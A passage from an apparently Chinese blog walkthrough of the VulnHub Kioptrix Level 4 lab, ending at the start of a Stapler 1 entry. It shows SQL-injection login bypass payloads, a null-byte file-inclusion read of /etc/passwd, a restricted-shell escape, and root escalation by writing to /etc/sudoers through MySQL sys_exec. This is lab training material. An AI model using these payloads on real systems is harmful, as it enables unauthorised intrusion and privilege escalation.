Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:C9:6F:5D (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 10h29m59s, deviation: 3h32m08s, median: 7h59m58s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.28a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: 2020-02-26T16:17:07-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.91 ms 192.168.80.19</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 33.76 seconds</span><br></pre></td></tr></table></figure>
<h2 id="登录页面存在sql注入"><a href="#登录页面存在sql注入" class="headerlink" title="登录页面存在sql注入"></a>登录页面存在sql注入</h2><p>输入url地址：<a href="http://192.168.80.19/，进入网站登录页面。">http://192.168.80.19/，进入网站登录页面。</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca4cp73ajj30zp0nj410.jpg" alt="image.png"><br>输入用户名：admin，密码：’or ‘1’=’1。可以看到提示信息，说明存在sql注入。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gca5nyyiunj30zq0nd75l.jpg" alt="image.png"><br>sql注入的原理：</p>
<ul>
<li>查询语句：<br>SELECT * FROM USERS WHERE username=’admin’ AND password=’ENTERED_PASSWORD’;</li>
<li>注入之后，查询语句为：<br>SELECT * FROM USERS WHERE username=’admin’ AND password=’’or ‘1’=’1’;<h2 id="存在文件包含漏洞"><a href="#存在文件包含漏洞" class="headerlink" title="存在文件包含漏洞"></a>存在文件包含漏洞</h2>登录后的页面：<a href="http://192.168.80.19/member.php?username=">http://192.168.80.19/member.php?username=</a>.<br>这里把username的值改为<code>.</code>，看到页面返回结果如下：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcauzqfv11j30zo0nemyq.jpg" alt="image.png"><br>把username的值改为<code>/</code>，页面返回结果如下：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcav18kpcwj30zq0ndq4f.jpg" alt="image.png"><br>把username的值改为<code>/etc/passwd</code>，页面返回结果如下：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcav3x4iioj30zt0ndq4b.jpg" alt="image.png"><br>把username的值改为<code>/etc/networks</code>，页面返回结果如下：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcav4r4khgj30zn0nfdh5.jpg" alt="image.png"><br>把username的值改为<code>/proc/version</code>，页面返回结果如下：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcav6sohkej30zq0ni0uc.jpg" alt="image.png"><br>以上实验，可以推断出，输入用户名之后，url路径会自动转到username/username.php这个页面，并且用户名里面的<code>etc</code>会被系统过滤掉。<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>于是利用刚刚发现的规律，我们在username这个值的后面加上空字符串<code>%00</code>，取消url路径中的后缀<code>.php</code>，达到执行恶意shell脚本的目的。<br>把username的值改为<code>/proc/version%00</code>，从页面返回结果获取到靶机的内核版本是<code>Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcavdjn111j30zn0niabd.jpg" alt="image.png"><br>把username的值改为<code>/etetcc/passwd%00</code>，从页面返回结果获取到用户名：<code>loneferret、john、robert</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcavgpsgkzj30zk0nb0v6.jpg" alt="image.png"><br>将username的值依次改为<code>loneferret、john、robert</code>，发现john和robert这两个用户是常用用户。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcavrb8lphj30zp0nita0.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcavrthgojj30zr0ng3zx.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcavsgmiaej30zj0na3zs.jpg" alt="image.png"><br>进入登录页面，用户名填写<code>john、robert</code>，密码填写注入语句：<code>1&#39;or&#39;1&#39;=&#39;1</code>或者<code>&#39;or 1=1#</code>。于是获取到john的密码是：<code>MyNameIsJohn</code><br>robert的密码是：<code>ADGAdsafdfwt4gadfga==</code><br>注意：获取到john的密码之后，要清除浏览器缓存，重新输入sql注入语句，获取robert的密码。或者简单一点，重新开一个隐私窗口进行sql注入，获取robert的密码。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcaw9schdmj30zn0nbmyi.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcavypl6toj30zi0newfx.jpg" alt="image.png"><h2 id="用ssh远程登录靶机的john用户"><a href="#用ssh远程登录靶机的john用户" class="headerlink" title="用ssh远程登录靶机的john用户"></a>用ssh远程登录靶机的john用户</h2>ssh登录john：<code>ssh john@192.168.80.19</code>。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh john@192.168.80.19</span><br><span class="line">The authenticity of host &#x27;192.168.80.19 (192.168.80.19)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.80.19&#x27; (RSA) to the list of known hosts.</span><br><span class="line">john@192.168.80.19&#x27;s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is in place so you  don&#x27;t screw up</span><br><span class="line">Type &#x27;?&#x27; or &#x27;help&#x27; to get the list of allowed commands</span><br><span class="line">john:~$</span><br></pre></td></tr></table></figure>
在shell中输入<code>?</code>，查看该shell可执行的命令。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john:~$ ?</span><br><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br></pre></td></tr></table></figure>
在shell中输入<code>echo os.system(&quot;/bin/bash&quot;)</code>，把靶机的shell放到攻击机的shell中执行。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john:~$ echo os.system(&quot;/bin/bash&quot;)</span><br><span class="line">john@Kioptrix4:~$ </span><br></pre></td></tr></table></figure>
输入命令：<code>ps aux|grep root</code>，查看以root权限运行的进程：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:~$ ps aux|grep root </span><br><span class="line">root         1  0.0  0.0   2844  1696 ?        Ss   Feb26   0:01 /sbin/init</span><br><span class="line">root         2  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kthreadd]</span><br><span class="line">root         3  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [migration/0]</span><br><span class="line">root         4  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ksoftirqd/0]</span><br><span class="line">root         5  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [watchdog/0]</span><br><span class="line">root         6  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [migration/1]</span><br><span class="line">root         7  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ksoftirqd/1]</span><br><span class="line">root         8  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [watchdog/1]</span><br><span class="line">root         9  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [migration/2]</span><br><span class="line">root        10  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ksoftirqd/2]</span><br><span class="line">root        11  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [watchdog/2]</span><br><span class="line">root        12  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [migration/3]</span><br><span class="line">root        13  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ksoftirqd/3]</span><br><span class="line">root        14  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [watchdog/3]</span><br><span class="line">root        15  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [events/0]</span><br><span class="line">root        16  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [events/1]</span><br><span class="line">root        17  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [events/2]</span><br><span class="line">root        18  0.0  0.0      0     0 ?        R&lt;   Feb26   0:00 [events/3]</span><br><span class="line">root        19  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [khelper]</span><br><span class="line">root        56  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kblockd/0]</span><br><span class="line">root        57  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kblockd/1]</span><br><span class="line">root        58  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kblockd/2]</span><br><span class="line">root        59  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kblockd/3]</span><br><span class="line">root        62  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kacpid]</span><br><span class="line">root        63  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kacpi_notify]</span><br><span class="line">root       195  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kseriod]</span><br><span class="line">root       249  0.0  0.0      0     0 ?        S    Feb26   0:00 [pdflush]</span><br><span class="line">root       250  0.0  0.0      0     0 ?        S    Feb26   0:01 [pdflush]</span><br><span class="line">root       251  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kswapd0]</span><br><span class="line">root       293  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [aio/0]</span><br><span class="line">root       294  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [aio/1]</span><br><span class="line">root       295  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [aio/2]</span><br><span class="line">root       296  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [aio/3]</span><br><span class="line">root      1552  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ata/0]</span><br><span class="line">root      1555  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ata/1]</span><br><span class="line">root      1557  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ata/2]</span><br><span class="line">root      1561  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ata/3]</span><br><span class="line">root      1563  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ata_aux]</span><br><span class="line">root      1592  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_0]</span><br><span class="line">root      1593  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_1]</span><br><span class="line">root      1653  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [ksuspend_usbd]</span><br><span class="line">root      1658  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [khubd]</span><br><span class="line">root      2492  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_2]</span><br><span class="line">root      2633  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_3]</span><br><span class="line">root      2634  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_4]</span><br><span class="line">root      2635  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_5]</span><br><span class="line">root      2636  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_6]</span><br><span class="line">root      2637  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_7]</span><br><span class="line">root      2638  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_8]</span><br><span class="line">root      2639  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_9]</span><br><span class="line">root      2640  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_10]</span><br><span class="line">root      2641  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_11]</span><br><span class="line">root      2642  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_12]</span><br><span class="line">root      2643  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_13]</span><br><span class="line">root      2644  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_14]</span><br><span class="line">root      2645  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_15]</span><br><span class="line">root      2646  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_16]</span><br><span class="line">root      2647  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_17]</span><br><span class="line">root      2648  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_18]</span><br><span class="line">root      2649  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_19]</span><br><span class="line">root      2650  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_20]</span><br><span class="line">root      2651  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_21]</span><br><span class="line">root      2652  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_22]</span><br><span class="line">root      2653  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_23]</span><br><span class="line">root      2654  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_24]</span><br><span class="line">root      2655  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_25]</span><br><span class="line">root      2656  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_26]</span><br><span class="line">root      2657  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_27]</span><br><span class="line">root      2658  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_28]</span><br><span class="line">root      2659  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_29]</span><br><span class="line">root      2660  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_30]</span><br><span class="line">root      2661  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_31]</span><br><span class="line">root      2662  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [scsi_eh_32]</span><br><span class="line">root      2883  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kjournald]</span><br><span class="line">root      3062  0.0  0.0   2236   724 ?        S&lt;s  Feb26   0:00 /sbin/udevd --daemon</span><br><span class="line">root      3551  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [btaddconn]</span><br><span class="line">root      3552  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [btdelconn]</span><br><span class="line">root      3562  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kgameportd]</span><br><span class="line">root      3757  0.0  0.0      0     0 ?        S&lt;   Feb26   0:00 [kpsmoused]</span><br><span class="line">root      4968  0.0  0.0   1716   488 tty4     Ss+  Feb26   0:00 /sbin/getty 38400 tty4</span><br><span class="line">root      4969  0.0  0.0   1716   492 tty5     Ss+  Feb26   0:00 /sbin/getty 38400 tty5</span><br><span class="line">root      4973  0.0  0.0   1716   492 tty2     Ss+  Feb26   0:00 /sbin/getty 38400 tty2</span><br><span class="line">root      4976  0.0  0.0   1716   488 tty3     Ss+  Feb26   0:00 /sbin/getty 38400 tty3</span><br><span class="line">root      4977  0.0  0.0   1716   484 tty6     Ss+  Feb26   0:00 /sbin/getty 38400 tty6</span><br><span class="line">root      5036  0.0  0.0   1872   540 ?        S    Feb26   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/kl</span><br><span class="line">root      5057  0.0  0.0   5316   992 ?        Ss   Feb26   0:00 /usr/sbin/sshd</span><br><span class="line">root      5113  0.0  0.0   1772   524 ?        S    Feb26   0:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class="line">root      5155  0.0  0.7 126988 16292 ?        Sl   Feb26   0:09 /usr/sbin/mysqld --basedir=/usr --datadir</span><br><span class="line">root      5156  0.0  0.0   1700   560 ?        S    Feb26   0:00 logger -p daemon.err -t mysqld_safe -i -t</span><br><span class="line">root      5240  0.0  0.0   6528  1352 ?        Ss   Feb26   0:00 /usr/sbin/nmbd -D</span><br><span class="line">root      5242  0.0  0.1  10108  2720 ?        Ss   Feb26   0:00 /usr/sbin/smbd -D</span><br><span class="line">root      5256  0.0  0.0  10108  1028 ?        S    Feb26   0:00 /usr/sbin/smbd -D</span><br><span class="line">root      5257  0.0  0.0   8084  1608 ?        Ss   Feb26   0:00 /usr/sbin/winbindd</span><br><span class="line">root      5280  0.0  0.0   8084  1160 ?        S    Feb26   0:00 /usr/sbin/winbindd</span><br><span class="line">root      5289  0.0  0.0   2104   888 ?        Ss   Feb26   0:00 /usr/sbin/cron</span><br><span class="line">root      5311  0.0  0.3  20464  6756 ?        Ss   Feb26   0:01 /usr/sbin/apache2 -k start</span><br><span class="line">root      5367  0.0  0.0   1716   492 tty1     Ss+  Feb26   0:00 /sbin/getty 38400 tty1</span><br><span class="line">root      5401  0.0  0.0   8084   868 ?        S    Feb26   0:00 /usr/sbin/winbindd</span><br><span class="line">root      5402  0.0  0.0   8092  1264 ?        S    Feb26   0:00 /usr/sbin/winbindd</span><br><span class="line">root      6546  0.0  0.1  11360  3720 ?        Ss   08:38   0:00 sshd: john [priv]</span><br><span class="line">john      6599  0.0  0.0   3004   752 pts/0    R+   08:45   0:00 grep root</span><br></pre></td></tr></table></figure>
<h2 id="进入Mysql数据库"><a href="#进入Mysql数据库" class="headerlink" title="进入Mysql数据库"></a>进入Mysql数据库</h2>查看靶机/var/www/这个目录下面的内容，发现checklogin.php这个关键文件。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:~$ cd /var/www/</span><br><span class="line">john@Kioptrix4:/var/www$ ls</span><br><span class="line">checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert</span><br><span class="line">john@Kioptrix4:/var/www$ cat checklogin.php </span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line"><span class="meta">$</span><span class="bash">host=<span class="string">&quot;localhost&quot;</span>; // Host name</span></span><br><span class="line"><span class="meta">$</span><span class="bash">username=<span class="string">&quot;root&quot;</span>; // Mysql username</span></span><br><span class="line"><span class="meta">$</span><span class="bash">password=<span class="string">&quot;&quot;</span>; // Mysql password</span></span><br><span class="line"><span class="meta">$</span><span class="bash">db_name=<span class="string">&quot;members&quot;</span>; // Database name</span></span><br><span class="line"><span class="meta">$</span><span class="bash">tbl_name=<span class="string">&quot;members&quot;</span>; // Table name</span></span><br><span class="line"></span><br><span class="line">// Connect to server and select databse.</span><br><span class="line">mysql_connect(&quot;$host&quot;, &quot;$username&quot;, &quot;$password&quot;)or die(&quot;cannot connect&quot;);</span><br><span class="line">mysql_select_db(&quot;$db_name&quot;)or die(&quot;cannot select DB&quot;);</span><br><span class="line"></span><br><span class="line">// Define $myusername and $mypassword</span><br><span class="line"><span class="meta">$</span><span class="bash">myusername=<span class="variable">$_POST</span>[<span class="string">&#x27;myusername&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">mypassword=<span class="variable">$_POST</span>[<span class="string">&#x27;mypassword&#x27;</span>];</span></span><br><span class="line"></span><br><span class="line">// To protect MySQL injection (more detail about MySQL injection)</span><br><span class="line"><span class="meta">$</span><span class="bash">myusername = stripslashes(<span class="variable">$myusername</span>);</span></span><br><span class="line"><span class="meta">//$</span><span class="bash">mypassword = stripslashes(<span class="variable">$mypassword</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">myusername = mysql_real_escape_string(<span class="variable">$myusername</span>);</span></span><br><span class="line"><span class="meta">//$</span><span class="bash">mypassword = mysql_real_escape_string(<span class="variable">$mypassword</span>);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//$</span><span class="bash">sql=<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">result=mysql_query(<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>);</span></span><br><span class="line"><span class="meta">//$</span><span class="bash">result=mysql_query(<span class="variable">$sql</span>);</span></span><br><span class="line"></span><br><span class="line">// Mysql_num_row is counting table row</span><br><span class="line"><span class="meta">$</span><span class="bash">count=mysql_num_rows(<span class="variable">$result</span>);</span></span><br><span class="line">// If result matched $myusername and $mypassword, table row must be 1 row</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if($</span><span class="bash">count!=0)&#123;</span></span><br><span class="line">// Register $myusername, $mypassword and redirect to file &quot;login_success.php&quot;</span><br><span class="line">        session_register(&quot;myusername&quot;);</span><br><span class="line">        session_register(&quot;mypassword&quot;);</span><br><span class="line">        header(&quot;location:login_success.php?username=$myusername&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">echo &quot;Wrong Username or Password&quot;;</span><br><span class="line">print(&#x27;&lt;form method=&quot;link&quot; action=&quot;index.php&quot;&gt;&lt;input type=submit value=&quot;Try Again&quot;&gt;&lt;/form&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
从checklogin.php这个文件，我们可以发现Mysql的root密码为空值。于是尝试登入Mysql数据库。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:/var/www$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 67</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the buffer.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
登入Mysql可以看到，靶机使用的Mysql版本号是：<code>5.0.51a-3ubuntu5.4</code>。<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2>在Mysql命令行输入<code>SELECT sys_exec(&quot;echo &#39;john ALL=(ALL) ALL&#39; &gt;&gt; /etc/sudoers&quot;);</code>，将john的权限提升为root。于是我们可以在john的shell里面使用<code>sudo bash</code>切换到root权限的shell，输入john的密码就得到root权限了。<br>注意：我们能够在Mysql里面使用shell命令，是因为靶机有这个模块<code>lib_mysqludf_sys.so</code>。<a href="https://blog.csdn.net/mypcstyle/article/details/37511991">参考资料</a><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Kioptrix4:/# whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
用Mysql的SELECT执行shell：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT sys_exec(<span class="string">&quot;echo &#x27;john ALL=(ALL) ALL&#x27; &gt;&gt; /etc/sudoers&quot;</span>);</span></span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| sys_exec(&quot;echo &#x27;john ALL=(ALL) ALL&#x27; &gt;&gt; /etc/sudoers&quot;) |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| NULL                                                  | </span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> Aborted</span></span><br><span class="line">john@Kioptrix4:/var/www$ sudo bash</span><br><span class="line">[sudo] password for john: </span><br><span class="line">root@Kioptrix4:/var/www# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h2 id="etc-sudoers是什么"><a href="#etc-sudoers是什么" class="headerlink" title="/etc/sudoers是什么"></a>/etc/sudoers是什么</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Kioptrix4:/# cat /etc/sudoers </span><br><span class="line"><span class="meta">#</span><span class="bash"> /etc/sudoers</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># See the man page for details on how to write a sudoers file.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"></span></span><br><span class="line">Defaults        env_reset</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Host <span class="built_in">alias</span> specification</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> User <span class="built_in">alias</span> specification</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Cmnd <span class="built_in">alias</span> specification</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> User privilege specification</span></span><br><span class="line">root    ALL=(ALL) ALL</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Uncomment to allow members of group sudo to not need a password</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (Note that later entries override this, so you might need to move</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> it further down)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> %sudo ALL=NOPASSWD: ALL</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Members of the admin group may gain root privileges</span></span><br><span class="line"><span class="meta">%</span><span class="bash">admin ALL=(ALL) ALL</span></span><br><span class="line">john ALL=(ALL) ALL #这就是通过Mysql命令行写入的，将john的权限提升为root</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><a href="https://nandtech.co/2017/07/16/penetration-testing-practice-hacking-kioptrix-l4/">https://nandtech.co/2017/07/16/penetration-testing-practice-hacking-kioptrix-l4/</a></li>
</ul>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>Kioptix Level 4</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之Stapler 1</title>
    <url>//posts/ZH-CN/Vulnhub_Stapler1.html</url>
    <content><![CDATA[<h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>将ovf文件导入VirtualBox：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckftc3cohj31f60u0gqc.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<blockquote>
<p>拓展知识：查看文件的校验码<br>查看ovf文件的hash值：<code>certutil.exe -hashfile .\Stapler.ovf</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckfzmfashj313d0ll75v.jpg" alt="image.png"></p>
</blockquote>
<p>kali机器和靶机都设置为桥接模式：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcki40cyncj30n90eit9p.jpg" alt="image.png"><br>kali机器的IP为：192.168.1.20。</p>
